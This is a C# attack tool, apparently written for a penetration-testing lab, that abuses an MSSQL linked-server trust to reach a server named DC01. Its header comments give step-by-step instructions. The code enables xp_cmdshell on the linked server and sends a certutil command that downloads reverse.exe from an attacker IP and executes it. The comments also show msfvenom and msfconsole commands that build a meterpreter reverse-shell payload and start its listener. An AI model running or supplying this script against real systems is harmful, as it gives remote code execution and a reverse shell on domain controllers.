// ================================================================
// linked_server_rev_shell.cs — Reverse Shell via MSSQL Linked Server xp_cmdshell
// ================================================================
// WHAT THIS DOES:
//   Connects to a SQL Server, discovers its linked server named DC01,
//   enables xp_cmdshell on the LINKED server (not the one you connect to),
//   then uses xp_cmdshell on DC01 to:
//     1. Download your reverse.exe payload using certutil
//     2. Execute it — triggering a reverse shell / meterpreter callback
//
//   This achieves code execution on DC01 through the SQL linked server
//   trust relationship — without directly connecting to DC01.
//
// PREREQUISITES:
//   - You must have SQL access to appsrv01 (the initial SQL server)
//   - appsrv01 must have a linked server connection TO DC01
//   - The linked server trust level must be high enough to use EXEC ... AT
//   - You need RPC Out enabled on the linked server (the code enables it)
//
// ----------------------------------------------------------------
// BEFORE YOU RUN — CHANGE THESE VALUES
// ----------------------------------------------------------------
//   string sqlServer   = "192.168.182.6"      -> IP of initial SQL server (appsrv01)
//   string attackerIP  = "192.168.45.186"     -> YOUR Kali IP
//   int    httpPort    = 4444                  -> Port where you're serving reverse.exe
//
//   The destination path for the payload is: C:\Users\Public\reverse.exe
//   Change this in the code if needed.
//
// ----------------------------------------------------------------
// PREPARE YOUR PAYLOAD (on Kali)
// ----------------------------------------------------------------
//   msfvenom -p windows/x64/meterpreter/reverse_tcp \
//     LHOST=<YOUR_IP> LPORT=443 -f exe -o reverse.exe
//   cp reverse.exe /var/www/html/reverse.exe
//   python3 -m http.server 4444
//
//   NOTE: httpPort (4444) is where you SERVE the .exe.
//         LPORT (443) is where meterpreter CALLS BACK.
//         These are two different ports.
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:linked_server_rev_shell.exe linked_server_rev_shell.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it anything, Framework: .NET Framework 4.x, click Create
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Find: bin\Debug\linked_server_rev_shell.exe
//
// ----------------------------------------------------------------
// RUN — COMPLETE ATTACK WORKFLOW
// ----------------------------------------------------------------
//
//   STEP 1 — Generate and host your payload on Kali:
//     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.186 LPORT=443 -f exe -o reverse.exe
//     python3 -m http.server 4444
//
//   STEP 2 — Start your meterpreter listener on Kali:
//     msfconsole -q -x "use exploit/multi/handler; \
//       set payload windows/x64/meterpreter/reverse_tcp; \
//       set LHOST 192.168.45.186; set LPORT 443; exploit -j"
//
//   STEP 3 — Run this tool from a Windows machine with SQL access to appsrv01:
//     .\linked_server_rev_shell.exe
//
//   STEP 4 — Watch Kali for the certutil download then the reverse shell connection.
//
//   Output should show:
//     Auth success!
//     Linked SQL server: DC01
//     Command to download and execute reverse.exe sent to DC01.
//
// BEFORE RUNNING, CHANGE:
//   - sqlServer   -> IP of your initial SQL server (appsrv01)
//   - attackerIP  -> your Kali IP
//   - httpPort    -> port where you're serving reverse.exe


using System;
using System.Data.SqlClient;
using System.Text;

namespace SQLLinkedRevShell
{
    class Program
    {
        static void Main(string[] args)
        {
            string sqlServer = "192.168.182.6";
            string database = "master";
            string attackerIP = "192.168.45.186";
            int httpPort = 4444; // Port where you are hosting reverse.exe

            string conString = $"Server={sqlServer};Database={database};Integrated Security=True;";

            using (SqlConnection con = new SqlConnection(conString))
            {
                try { con.Open(); Console.WriteLine("Auth success!"); }
                catch (Exception ex) { Console.WriteLine($"Connect failed: {ex.Message}"); return; }

                try
                {
                    string linkedName = "";
                    Console.WriteLine("\nLinked servers:");
                    using (SqlCommand cmd = new SqlCommand("EXEC sp_linkedservers;", con))
                    using (SqlDataReader r = cmd.ExecuteReader())
                    {
                        while (r.Read())
                        {
                            string name = r[0].ToString();
                            Console.WriteLine("Linked SQL server: " + name);
                            if (name.ToUpper().Contains("DC01")) linkedName = name;
                        }
                    }

                    if (string.IsNullOrEmpty(linkedName)) { Console.WriteLine("DC01 not found."); return; }

                    // Enable RPC Out if needed
                    object rpc = new SqlCommand($"SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '{linkedName.Replace("'", "''")}'", con).ExecuteScalar();
                    if (rpc != null && Convert.ToInt32(rpc) == 0)
                    {
                        ExecuteNonQuery(con, $"EXEC sp_serveroption '{linkedName.Replace("'", "''")}', 'rpc out', 'true';");
                    }

                    // Enable xp_cmdshell on DC01
                    ExecuteNonQuery(con, $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linkedName}]");
                    ExecuteNonQuery(con, $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedName}]");

                    // =================================================================
                    // NEW PAYLOAD TO DOWNLOAD AND EXECUTE reverse.exe
                    // =================================================================

                    // Define the web URL and the destination path on the target
                    string payloadUrl = $"http://{attackerIP}:{httpPort}/reverse.exe";
                    string destinationPath = "C:\\Users\\Public\\reverse.exe";

                    // Construct the command to download and execute the .exe
                    // We use cmd.exe to chain the download (certutil) and execution.
                    string downloadCommand = $"certutil -urlcache -f {payloadUrl} {destinationPath}";
                    string executeCommand = destinationPath;
                    string finalCommand = $"cmd /c \"{downloadCommand} && {executeCommand}\"";

                    // Execute the final command on the linked server.
                    // No Base64 encoding is needed for this simple cmd command.
                    ExecuteNonQuery(con, $"EXEC ('xp_cmdshell ''{finalCommand}''') AT [{linkedName}]");

                    Console.WriteLine("Command to download and execute reverse.exe sent to DC01.");
                }
                catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
            }
        }

        static void ExecuteNonQuery(SqlConnection con, string query)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                cmd.ExecuteNonQuery();
            }
        }
    }
}